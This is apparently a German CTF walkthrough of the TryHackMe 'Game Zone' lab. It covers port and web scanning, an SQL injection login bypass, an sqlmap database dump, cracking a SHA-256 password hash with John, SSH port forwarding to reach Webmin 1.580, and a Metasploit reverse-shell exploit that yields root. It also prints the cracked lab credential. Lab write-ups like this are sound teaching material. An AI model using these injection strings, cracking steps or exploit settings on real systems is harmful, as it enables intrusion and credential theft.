# Ziel 10.10.3.133

# Scanning
## Nmap 

```
ORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
-> SSH offen
-> Website unter port 80
-> Linux System 

## Nikto

```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.3.133
+ Target Hostname:    10.10.3.133
+ Target Port:        80
+ Start Time:         2025-10-09 13:34:32 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2025-10-09 13:34:47 (GMT1) (15 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

-> Session ohne http Only erstellt 

## gobuster

```
[+] Url:                     http://10.10.3.133:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.3.133/images/]
/server-status        (Status: 403) [Size: 299]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished

```

## Walking the App 

-> Startseite beinhaltet Login option

# Exploiting 

THM gibt eine SQLi bei der Maske vor

Versuch mit SQLi 

```
'OR 1=1;-- 
```
in anmelde Feld ->  Erfolg 

Nach der Anmeldung werden wir an /Portal.php weitergegeben. Diese besteht eigentlich nur aus einer Suchzeile die wir aber nutzen können für weitere SQLi 

Hier jetzt mit SQLMap, damit das aber Funktionieren kann müssen wir an SQL Map eine Authentifizierte session geben. Das machen wir indem wir einen Request an die Suche mit Burp Capturen und abspeichern. Diesen habe ich als 'request.txt' gespeichert 

Ausführen SQL Map: 
```
sqlmap -r request.txt --dbms=mysql --dump
```

hier bekommen wir dann auch einige infos

```
[13:50:26] [WARNING] no clear password(s) found                                                                                                                                
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[13:50:26] [INFO] table '`db`.users' dumped to CSV file '/root/.sqlmap/output/10.10.3.133/dump/db/users.csv'
[13:50:26] [INFO] fetching columns for table 'post' in database 'db'
[13:50:26] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+------+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id   | name                           | description                                                                                                                                                                                            |
+------+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 2    | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3    | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4    | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 1    | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 5    | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+------+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

```

da wir einen PW hash haben können wir den mit John knacken und dann vllt via SSH anmelden. Ist aber auch nicht direkt nötig. Die Seite crackstation.net kennt den Hash und das passende PW. Der Vollständigkeit knacke ich das aber auch noch per hand. Hash type = sha256

```
root@ip-10-10-64-221:~# john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (?)
1g 0:00:00:02 DONE (2025-10-09 14:16) 0.4784g/s 1395Kp/s 1395Kc/s 1395KC/s vimivera..veluasan
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 
```
Schon haben wir auch so das PW: videogamer124

jetzt können wir uns einfach als agent47 via ssh verbinden und sind auf dem Server. 

# Exposing Services with reverse SSH Tunnel

Das habe ich noch nie genutzt deshalb kurze Erklärung was das ist. 

https://imgur.com/3YeEzxH

Wir nutzen jetzt hier SS tool um Festzustellen was für Sockets auf dem Ziel laufen. 

```
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q                                                                                                                                              Local Address:Port                                                                                                                                                             Peer Address:Port              
udp    UNCONN     0      0                                                                                                                                                               *:68                                                                                                                                                                          *:*                  
udp    UNCONN     0      0                                                                                                                                                               *:10000                                                                                                                                                                       *:*                  
tcp    LISTEN     0      128                                                                                                                                                             *:22                                                                                                                                                                          *:*                  
tcp    LISTEN     0      80                                                                                                                                                      127.0.0.1:3306                                                                                                                                                                        *:*                  
tcp    LISTEN     0      128                                                                                                                                                             *:10000                                                                                                                                                                       *:*                  
tcp    LISTEN     0      128                                                                                                                                                            :::22                                                                                                                                                                         :::*                  
tcp    LISTEN     0      128                                                                                                                                                            :::80                                                                                                                                                                         :::*                  

```

Wir können sehen, dass ein Dienst, der auf Port 10000 läuft, durch eine Firewall-Regel von außen blockiert wird (das können wir in der IPtable-Liste sehen). Mit einem SSH-Tunnel können wir den Port jedoch für uns (lokal) freigeben!

Zum Tunneln führen wir jetzt das aus:; 

```
ssh -L 10000:localhost:10000 agent47@10.10.3.133

```
  

Geben Sie anschließend in Ihrem Browser „localhost:10000“ ein, um auf den neu freigegebenen Webserver zuzugreifen.

jetzt bekommen wir die Seite des 2. Ziels. 

Insofern fangen wir wieder von Forne mit 

# Enumeration Ziel 2
Beim Öffnen sehen wir das es sich um das CMS "Webmin" handelt

Versuch mit bereits vorhandenen Creds (agent47:videogamer124) anzumelden -> Erfolgreich 

Nach anmeldung feststellung: 

```
System hostname 	gamezone (127.0.1.1)
Operating system 	Ubuntu Linux 16.04.6
Webmin version 	1.580
Time on system 	Thu Oct 9 08:45:04 2025
Kernel and CPU 	Linux 4.4.0-159-generic on x86_64
```



# Exploiting Ziel 2

```
root@ip-10-10-64-221:~# searchsploit webmin 1.580
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Comman | unix/remote/21851.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execut | linux/webapps/47330.rb
---------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Wir nehmen hier jetzt dann metasploit 

```
search webmin 1.580

atching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/admin/webmin/edit_html_fileaccess

```

der Exploit 0 sieht gut aus. Hier müssen wir dann noch Optionen setzen. 

```
set PAYLOAD payload/cmd/unix/reverse
set PASSWORDS videogamer124
set USERNAME agent47
set RHOSTS 127.0.0.1              #Da wir das ja auf Localhost mit Port 10000 tunneln
set RPORT 10000
set SSL false
```

danach nurnoch `exploit` und wir erhalten die Revshell und bei whoami sehen wir sogar das die shell schon root ist

